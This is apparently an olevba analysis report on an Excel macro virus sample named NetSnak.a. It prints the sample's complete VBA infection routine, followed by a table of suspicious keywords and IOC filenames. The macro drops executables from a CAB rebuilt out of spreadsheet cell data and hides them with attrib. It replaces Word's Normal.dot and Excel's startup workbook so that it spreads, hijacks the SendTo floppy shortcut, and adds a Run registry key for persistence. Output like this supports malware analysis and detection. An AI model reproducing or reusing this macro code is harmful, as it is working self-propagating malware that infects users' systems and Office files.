olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.NetSnak.a-bb3f65321de1d5cdc2bc31c81b0d4fc2f29def63
Type: OpenXML
-------------------------------------------------------------------------------
VBA MACRO Module1.bas 
in file: xl/vbaProject.bin - OLE stream: 'VBA/Module1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub createcabfile()
Dim ch As Byte
On Error Resume Next
Set fso = CreateObject("scripting.filesystemobject")
Set w = CreateObject("wscript.shell")
myfolder = w.SpecialFolders("Templates") & "\Software\"
If Not fso.folderexists(myfolder) Then
fso.createfolder myfolder
End If
For i = 1 To Workbooks.Count
If Workbooks(i).Name = "normal.xlm" Then
Workbooks(i).Close
fso.deletefile Application.StartupPath & "\normal.xlm"
End If
Next
For i = 1 To Workbooks.Count
If Workbooks(i).Name = "norma1.xlm" Then
GoTo a1
End If
Next
cabfile = "c:\cab.cab"
If Not fso.fileexists(Application.StartupPath & "\norma1.xlm") Then
fso.Delete cabfile
Open cabfile For Binary Access Write As #1
For i = 1 To 150
hv = ThisWorkbook.Sheets("(m1)_(m2)_(m3)").Cells(i, 2).Value
n = 1
m = InStr(hv, " ")
Do While m > 0
ch = CByte(Mid(hv, n, m - n))
Put #1, , ch
n = m + 1
m = InStr(n, hv, " ")
Loop
Next
Close #1
w.Run "%COMSPEC% /c attrib -s -h c:\setflag.exe", 0, True
w.Run "%COMSPEC% /c attrib -s -h c:\sendto.exe", 0, True
w.Run "%COMSPEC% /c extrac32 /E /Y /L c:\ c:\cab.cab", 0, True
w.Run "%COMSPEC% /c extract /E /Y /L c:\ c:\cab.cab", 0, True
fso.deletefile cabfile
fso.copyfile "c:\normal.dot", myfolder, True
Set word = CreateObject("word.application")
ntpath = word.NormalTemplate.Path & "\"
word.Quit
fso.copyfile "c:\normal.dot", ntpath, True
fso.copyfile "c:\norma1.xlm", Application.StartupPath & "\", True
fso.copyfile "c:\internet.exe", fso.getspecialfolder(1) & "\"
Set fold = fso.getfolder(w.SpecialFolders("SendTo"))
For Each ff In fold.Files
If InStr(ff.Name, "软盘") > 0 Then
Set lnk = w.CreateShortcut(fold.Path & "\" & ff.Name)
lnk.TargetPath = "c:\sendto.exe"
lnk.IconLocation = "shell32.dll,6"
lnk.Save
GoTo e2
End If
Next
e2:
fso.deletefile "c:\normal.dot"
fso.deletefile "c:\norma1.xlm"
fso.deletefile "c:\internet.exe"
w.Run "%COMSPEC% /c attrib +s +h c:\setflag.exe", 0, True
w.Run "%COMSPEC% /c attrib +s +h c:\sendto.exe", 0, True
w.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\Internet.exe", "internet.exe"
w.regdelete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\Internat.exe"
End If
Workbooks.Open Application.StartupPath & "\norma1.xlm"
ThisWorkbook.Sheets("(m1)_(m2)_(m3)").Columns(2).Copy Workbooks("norma1.xlm").Sheets("(m1)_(m2)_(m3)").Columns(2)
Workbooks("norma1.xlm").Save
fso.copyfile Application.StartupPath & "\norma1.xlm", myfolder, True
a1:
fso.deletefile "c:\excel.txt"
Application.DisplayAlerts = False
For i = 1 To ThisWorkbook.Sheets.Count
If Left(ThisWorkbook.Sheets(i).Name, 3) = "模块表" Then
ThisWorkbook.Sheets(i).Delete
End If
Next
Application.DisplayAlerts = True
ThisWorkbook.Saved = True
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Put                 |May write to a file (if combined with Open)  |
|Suspicious|Binary              |May read or write a binary file (if combined |
|          |                    |with Open)                                   |
|Suspicious|copyfile            |May copy a file                              |
|Suspicious|shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|wscript.shell       |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|shell32             |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|IOC       |setflag.exe         |Executable file name                         |
|IOC       |sendto.exe          |Executable file name                         |
|IOC       |internet.exe        |Executable file name                         |
|IOC       |shell32.dll         |Executable file name                         |
|IOC       |Internet.exe        |Executable file name                         |
|IOC       |Internat.exe        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

